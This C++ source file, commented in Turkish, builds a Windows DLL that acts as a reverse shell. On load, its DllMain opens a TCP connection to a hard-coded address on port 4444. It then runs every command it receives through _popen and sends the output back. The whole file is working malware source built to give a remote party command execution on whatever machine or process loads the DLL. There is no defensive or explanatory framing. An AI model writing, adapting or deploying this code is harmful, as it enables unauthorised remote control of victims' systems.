#include "pch.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>

#pragma comment(lib, "ws2_32.lib")

SOCKET sock;

// Reverse Shell fonksiyonu
DWORD WINAPI ReverseShell(LPVOID lpParam) {
    char recvBuffer[1024];
    char sendBuffer[1024];
    while (true) {
        // Karşı taraftan komut al
        int recvResult = recv(sock, recvBuffer, sizeof(recvBuffer), 0);
        if (recvResult <= 0) break; // Bağlantı kesilirse çık

        recvBuffer[recvResult] = '\0';

        // Komutu çalıştır ve tüm çıktıyı oku
        FILE* pipe = _popen(recvBuffer, "r");
        if (!pipe) {
            strcpy_s(sendBuffer, "Komut çalıştırılamadı.\n");
        }
        else {
            std::string fullOutput;
            while (fgets(sendBuffer, sizeof(sendBuffer), pipe) != nullptr) {
                fullOutput += sendBuffer;
            }
            _pclose(pipe);

            // Çıktıyı karşıya gönder
            send(sock, fullOutput.c_str(), fullOutput.length(), 0);
        }
    }
    return 0;
}

// TCP bağlantısını başlatır
void StartConnection() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(4444); // Port numarası
    inet_pton(AF_INET, "192.168.176.130", &serverAddr.sin_addr); // IP adresi

    connect(sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr));
}

// DLL giriş noktası
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        StartConnection(); // TCP bağlantısını başlat
        CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL); // Reverse shell threadini başlat
        break;
    case DLL_PROCESS_DETACH:
        closesocket(sock); // Bağlantıyı kapat
        WSACleanup();
        break;
    }
    return TRUE;
}
